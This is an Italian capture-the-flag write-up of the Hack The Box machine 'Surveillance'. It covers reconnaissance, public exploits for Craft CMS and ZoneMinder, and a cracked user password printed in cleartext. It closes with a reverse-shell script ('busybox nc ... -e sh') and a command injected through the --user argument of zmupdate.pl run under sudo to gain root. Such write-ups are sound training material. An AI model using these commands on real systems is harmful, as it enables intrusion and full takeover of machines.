# Surveillance

## Reconnaissance

Per prima cosa eseguo una scansione iniziale con nmap.

```text
sudo nmap -sC -sV -O -oA /usr/share/nmap/initial 10.10.11.245
```

* **-sC**: scipt nmap di default
* **-sV**: per rilevare la versione dei servizi
* **-O**: per rilevare il SO
* **-oA**: per stampare tutti i formati e salvarli nel file _nmap/initial_

Il risultato della scansione è il seguente:

```text
Nmap scan report for 10.10.11.245 (10.10.11.245)
Host is up (0.044s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://surveillance.htb/
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=1/5%OT=22%CT=1%CU=41568%PV=Y%DS=2%DC=I%G=Y%TM=6597C
OS:D2C%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)S
OS:EQ(SP=105%GCD=4%ISR=109%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=106%GCD=1%ISR=109%TI=
OS:Z%CI=Z%II=I%TS=A)SEQ(SP=106%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M54
OS:DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6
OS:=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF
OS:=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%
OS:Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y
OS:%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%R
OS:D=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IP
OS:L=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Aggiungo _surveillance.htb_ al file _/etc/hosts_ e passo alla fase successiva.

## Enumeration

Successivamente, visito la pagina http://surveillance.htb/:

<p align="center">
  <img src="/Immagini/Linux-Box/Surveillance/surveillance-1.png"/>
</p>

Provo ad utilizzare il comando _dirsearch_:

```text
dirsearch -u http://surveillance.htb/
```

```text
[04:37:47] Starting:
[04:37:50] 301 -  178B  - /js  ->  http://surveillance.htb/js/
[04:42:24] 200 -    0B  - /.gitkeep
[04:42:57] 200 -  304B  - /.htaccess
[04:57:16] 302 -    0B  - /admin  ->  http://surveillance.htb/admin/login
[04:58:11] 302 -    0B  - /admin/  ->  http://surveillance.htb/admin/login
[04:58:19] 302 -    0B  - /admin/admin  ->  http://surveillance.htb/admin/login
[04:58:36] 200 -   38KB - /admin/admin/login
[04:58:53] 200 -   38KB - /admin/login
```

Ma il risultato ottenuto non è interessante, se non la pagina di login:

<p align="center">
  <img src="/Immagini/Linux-Box/Surveillance/surveillance-3.png"/>
</p>

Dopo aver fatto delle ricerche online scopro che _Craft CMS_ è vulnerabile e trovo un [repository](https://gist.github.com/gmh5225/8fad5f02c2cf0334249614eb80cbf4ce) contenente una POC.

## Exploitation

Modificando il codice riesco ed eseguendolo riesco ad ottenerne una shell:

<p align="center">
  <img src="/Immagini/Linux-Box/Surveillance/surveillance-2.png"/>
</p>

Purtroppo è una shell molto instabile, ma riesco a trovare un file di backup nel quale identifico uno user Matthew e l'hash della sua password.

Utilizzando _johntheripper_ ricavo la password:

```text
matthew:starcraft122490
```

Quindi accedo tramite ssh con le credenziali appena ottenute e conquisto il primo flag:

<p align="center">
  <img src="/Immagini/Linux-Box/Surveillance/surveillance-4.png"/>
</p>

## Privilege Escalation

Trasferisco lo script _linpeas.sh_ sulla macchina vittima e lo eseguo. Dal risultato emergono delle cose interessanti.

Sulla macchina è attiva la porta 8080:

<p align="center">
  <img src="/Immagini/Linux-Box/Surveillance/surveillance-5.png"/>
</p>

Inoltre, riesco a ricavare una password:

<p align="center">
  <img src="/Immagini/Linux-Box/Surveillance/surveillance-6.png"/>
</p>

Quindi creo un tunnel SSH locale dalla mia macchina alla macchina vittima:

```text
ssh -L 2323:127.0.0.1:8080 matthew@surveillance.htb
```

Visito la pagina _localhost:2323_:

<p align="center">
  <img src="/Immagini/Linux-Box/Surveillance/surveillance-7.png"/>
</p>

Facendo una ricerca su internet trovo una [vulnerabilità](https://github.com/rvizx/CVE-2023-26035) collegata a _ZoneMinder_.

Quindi seguo le istruzioni e ottengo una shell per l'utente _zoneminder_:

<p align="center">
  <img src="/Immagini/Linux-Box/Surveillance/surveillance-8.png"/>
</p>

Controllo i permessi dell'utente:

<p align="center">
  <img src="/Immagini/Linux-Box/Surveillance/surveillance-9.png"/>
</p>

Dopo aver perso un po di tempo online trovo una vulnerabilità collegata al file _zmupdate.pl_.

Per sfruttarla, come prima cosa creao un file _exploitzmupdate.sh_ nella cartella _/tmp_:

```text
#!/bin/bash
busybox nc 10.10.14.7 4444 -e sh
```

Poi lancio il seguente comando:

```text
sudo /usr/bin/zmupdate.pl --version=1 --user='$(/tmp/exploitzmupdate.sh)' --pass=ZoneMinderPassword2023
```

<p align="center">
  <img src="/Immagini/Linux-Box/Surveillance/surveillance-10.png"/>
</p>

**Sono root!**
